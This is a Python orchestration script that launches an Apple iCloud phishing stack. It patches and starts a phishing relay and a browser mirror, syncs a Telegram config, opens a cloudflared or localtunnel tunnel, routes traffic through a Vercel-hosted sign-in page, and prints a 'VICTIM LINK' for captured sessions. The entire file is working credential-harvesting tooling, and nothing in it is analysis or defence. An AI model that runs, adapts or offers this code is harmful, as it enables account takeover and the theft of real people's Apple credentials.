#!/usr/bin/env python3
"""One-shot Plan A stack: patch mirror, relay, tunnel, mirror, self-test, victim link."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

HARBOR_ROOT = Path(r"D:/pentest/apple/icloud/harbor")
HARBOR_RUN = Path(r"C:/Users/Admin/harbor_run")
TOOLS = HARBOR_ROOT / "tools"
CLOUDFLARED = TOOLS / "cloudflared.exe"
PATCH = Path.home() / ".cursor/projects/d-pentest-apple-icloud/apply_mirror_patch.py"
RELAY_PORT = 8931
SESSION = os.environ.get("HARBOR_SESSION", "op1")
HARBOR = os.environ.get("HARBOR", "https://harbor-ten-lake.vercel.app")
HERMES_PY = Path(
    r"C:/Users/Admin/AppData/Local/hermes/hermes-agent/venv/Scripts/python.exe"
)
LOCK_DIR = Path(os.environ.get("TEMP", ".")) / "harbor-mirror-locks"
_tunnel_proc: subprocess.Popen | None = None


def python_exe() -> str:
    if HERMES_PY.is_file():
        return str(HERMES_PY)
    return sys.executable


def http_json(url: str, *, method: str = "GET", body: dict | None = None, timeout: float = 10):
    data = None
    headers = {}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, json.loads(resp.read().decode())


def kill_stack() -> None:
    global _tunnel_proc
    if sys.platform != "win32":
        return
    ps = r"""
Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
  Where-Object { $_.CommandLine -match 'phish_mirror\.py|phish_relay\.py|localtunnel|cloudflared\.exe tunnel' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
"""
    subprocess.run(["powershell", "-NoProfile", "-Command", ps], check=False)
    if _tunnel_proc and _tunnel_proc.poll() is None:
        _tunnel_proc.terminate()
    _tunnel_proc = None
    lock = LOCK_DIR / f"relay-{RELAY_PORT}-{SESSION}.lock"
    lock.unlink(missing_ok=True)
    time.sleep(2)


RESTORE_RELAY = Path(r"D:/pentest/apple/icloud/_harbor_restore/harbor/mirror/phish_relay.py")


def sync_relay(py: str) -> None:
    dst = HARBOR_RUN / "phish_relay.py"
    for src in (HARBOR_ROOT / "mirror" / "phish_relay.py", RESTORE_RELAY):
        if not src.is_file():
            continue
        try:
            dst.write_bytes(src.read_bytes())
            print(f"sync relay from {src.name} -> {dst.stat().st_size} bytes")
            break
        except OSError as e:
            print(f"WARN: read {src}: {e}")
    if not dst.is_file() or dst.stat().st_size < 1000:
        raise SystemExit("phish_relay.py missing in harbor_run")
    patch = HARBOR_RUN / "patch_relay_batch.py"
    if patch.is_file():
        subprocess.run([py, str(patch)], cwd=str(HARBOR_RUN), check=False)


def sync_telegram_env() -> None:
    for src in (
        HARBOR_ROOT / "mirror" / ".env",
        Path(r"D:/pentest/apple/icloud/harbor/mirror/.env"),
    ):
        if not src.is_file():
            continue
        try:
            (HARBOR_RUN / ".env").write_bytes(src.read_bytes())
            print(f"sync telegram .env from {src.parent.name}")
            return
        except OSError as e:
            print(f"WARN: .env sync: {e}")


def patch_mirror_apple(py: str) -> None:
    p = HARBOR_RUN / "patch_mirror_apple.py"
    if p.is_file():
        subprocess.run([py, str(p)], cwd=str(HARBOR_RUN), check=True)


def run_patch(py: str) -> None:
    if not PATCH.is_file():
        print("WARN: no apply_mirror_patch.py")
        return
    r = subprocess.run([py, str(PATCH)], cwd=str(HARBOR_RUN))
    if r.returncode != 0 and not (HARBOR_RUN / "phish_mirror.py").is_file():
        raise SystemExit("apply_mirror_patch failed and no mirror")
    if r.returncode != 0:
        print("WARN: patch script returned", r.returncode)
    engine = HARBOR_RUN / "patch_apple_engine.py"
    if engine.is_file():
        subprocess.run([py, str(engine)], cwd=str(HARBOR_RUN), check=True)


def wait_relay(timeout_s: float = 30) -> None:
    url = f"http://127.0.0.1:{RELAY_PORT}/"
    for _ in range(int(timeout_s)):
        try:
            urllib.request.urlopen(url, timeout=3)
            return
        except OSError:
            time.sleep(1)
    raise SystemExit("relay did not start")


def start_relay(py: str) -> subprocess.Popen:
    log = HARBOR_RUN / "relay.log"
    f = open(log, "w", encoding="utf-8")
    return subprocess.Popen(
        [py, "phish_relay.py", "--port", str(RELAY_PORT)],
        cwd=str(HARBOR_RUN),
        stdout=f,
        stderr=subprocess.STDOUT,
    )


def save_tunnel_url(fwd: str) -> None:
    fwd = fwd.rstrip("/")
    for path in (HARBOR_RUN / "tunnel-url.txt", TOOLS / "tunnel-url.txt"):
        try:
            path.write_text(fwd, encoding="utf-8")
        except OSError:
            pass


def verify_tunnel(fwd: str) -> None:
    url = fwd.rstrip("/") + "/"
    headers = {}
    if ".loca.lt" in fwd:
        headers["Bypass-Tunnel-Reminder"] = "true"
    last_err: Exception | None = None
    for attempt in range(12):
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=25) as resp:
                body = resp.read(300)
                if b"harbor-phish-relay" in body or b'"ok"' in body:
                    return
                last_err = OSError(f"unexpected body: {body[:80]!r}")
        except urllib.error.HTTPError as e:
            last_err = e
            if e.code in (429, 503, 530) and attempt < 11:
                time.sleep(2 + attempt)
                continue
            raise SystemExit(f"tunnel unhealthy HTTP {e.code}") from e
        except OSError as e:
            last_err = e
            time.sleep(2)
    raise SystemExit(f"tunnel verify failed: {last_err}") from last_err


def start_tunnel() -> str:
    global _tunnel_proc
    if CLOUDFLARED.is_file():
        log = HARBOR_RUN / "cloudflared.log"
        log.write_text("", encoding="utf-8")
        f = open(log, "a", encoding="utf-8")
        _tunnel_proc = subprocess.Popen(
            [
                str(CLOUDFLARED),
                "tunnel",
                "--url",
                f"http://127.0.0.1:{RELAY_PORT}",
                "--protocol",
                "http2",
            ],
            stdout=f,
            stderr=subprocess.STDOUT,
        )
        for _ in range(45):
            time.sleep(1)
            raw = log.read_text(encoding="utf-8", errors="ignore")
            m = re.search(r"\|\s+(https://[^\s|]+\.trycloudflare\.com)", raw)
            if not m:
                m = re.search(r"(https://[a-z0-9-]+\.trycloudflare\.com)", raw)
            if m:
                fwd = m.group(1).strip()
                time.sleep(6)
                save_tunnel_url(fwd)
                try:
                    verify_tunnel(fwd)
                except SystemExit as e:
                    print("WARN:", e)
                return fwd
        raise SystemExit("cloudflared did not print a trycloudflare.com URL")

    log = HARBOR_RUN / "localtunnel.log"
    log.write_text("", encoding="utf-8")
    subprocess.Popen(
        ["npx", "--yes", "localtunnel", "--port", str(RELAY_PORT)],
        cwd=str(HARBOR_RUN),
        stdout=open(log, "w", encoding="utf-8"),
        stderr=subprocess.STDOUT,
        shell=True,
    )
    for _ in range(60):
        time.sleep(2)
        raw = log.read_text(encoding="utf-8", errors="ignore")
        for part in raw.split():
            if part.startswith("https://") and ".loca.lt" in part:
                fwd = part.rstrip("/")
                save_tunnel_url(fwd)
                verify_tunnel(fwd)
                return fwd
    raise SystemExit("localtunnel did not start")


def mirror_lock_pid() -> int | None:
    lock = LOCK_DIR / f"relay-{RELAY_PORT}-{SESSION}.lock"
    if not lock.is_file():
        return None
    try:
        return int(lock.read_text(encoding="utf-8").strip())
    except ValueError:
        return None


def pid_alive(pid: int) -> bool:
    if sys.platform == "win32":
        out = subprocess.run(
            ["tasklist", "/FI", f"PID eq {pid}"],
            capture_output=True,
            text=True,
            check=False,
        ).stdout
        return str(pid) in out
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def start_mirror(py: str, fwd: str) -> None:
    args = [
        py,
        "phish_mirror.py",
        "--remote",
        "--relay",
        f"http://127.0.0.1:{RELAY_PORT}",
        "--public-relay",
        fwd,
        "--relay-port",
        "0",
        "--session",
        SESSION,
        "--harbor",
        HARBOR,
        "--channel",
        "chrome",
        "--out",
        "captured",
    ]
    subprocess.Popen(
        args,
        cwd=str(HARBOR_RUN),
        creationflags=subprocess.CREATE_NEW_CONSOLE if sys.platform == "win32" else 0,
    )


def wait_mirror(timeout_s: int = 90) -> int:
    for _ in range(timeout_s):
        pid = mirror_lock_pid()
        if pid and pid_alive(pid):
            return pid
        time.sleep(1)
    raise SystemExit("mirror did not acquire lock")


def self_test(fwd: str, py: str) -> None:
    env = os.environ.copy()
    env["FWD"] = fwd
    env["SESSION"] = SESSION
    r = subprocess.run([py, "test_remote_relay.py"], cwd=str(HARBOR_RUN), env=env)
    if r.returncode != 0:
        print("WARN: self-test failed")


def test_batch_relay() -> None:
    batch = {
        "session": SESSION,
        "events": [
            {"type": "email-commit", "payload": {"account": "batch-check@example.com"}, "seq": 1, "t": 1},
            {"type": "submit", "payload": {"step": "email", "account": "batch-check@example.com"}, "seq": 2, "t": 2},
        ],
    }
    try:
        http_json(f"http://127.0.0.1:{RELAY_PORT}/relay/event", method="POST", body=batch)
        print("OK: relay accepts Continue batch")
    except urllib.error.HTTPError as e:
        if e.code == 400:
            raise SystemExit("FATAL: relay rejects batch — run patch_relay_batch.py")
        raise


def test_vercel_path(fwd: str) -> None:
    batch = {
        "session": SESSION,
        "event": {
            "type": "submit",
            "payload": {"step": "email", "account": "proxy-check@example.com"},
            "seq": 1,
            "t": 1,
        },
    }
    q = urllib.parse.quote(fwd, safe="")
    url = f"{HARBOR}/api/relay/event?upstream={q}"
    req = urllib.request.Request(
        url,
        data=json.dumps(batch).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=90) as resp:
        txt = resp.read().decode()
    if '"ok"' not in txt:
        raise SystemExit(f"Vercel->tunnel path failed: {txt[:120]}")
    print("OK: Vercel -> tunnel -> relay (live path)")


def main() -> None:
    py = python_exe()
    print("Python:", py)
    kill_stack()
    run_patch(py)
    sync_relay(py)
    sync_telegram_env()
    patch_mirror_apple(py)
    print("Starting relay...")
    relay_proc = start_relay(py)
    wait_relay()
    test_batch_relay()
    print("Starting tunnel (cloudflared preferred)...")
    fwd = start_tunnel()
    print("Tunnel:", fwd)
    test_vercel_path(fwd)
    print("Starting mirror...")
    start_mirror(py, fwd)
    pid = wait_mirror()
    print(f"Mirror lock PID: {pid}")
    print("Waiting for Apple tab (~40s)...")
    time.sleep(40)
    self_test(fwd, py)
    try:
        urllib.request.urlopen(
            f"http://127.0.0.1:{RELAY_PORT}/relay/reset?session={urllib.parse.quote(SESSION)}",
            timeout=5,
        )
    except OSError:
        pass
    victim = f"{HARBOR}/signin?sid={SESSION}&fwd={urllib.parse.quote(fwd, safe='')}"
    print("\nVICTIM LINK:\n", victim, sep="")
    if relay_proc.poll() is not None:
        print("WARN: relay process exited")


if __name__ == "__main__":
    main()
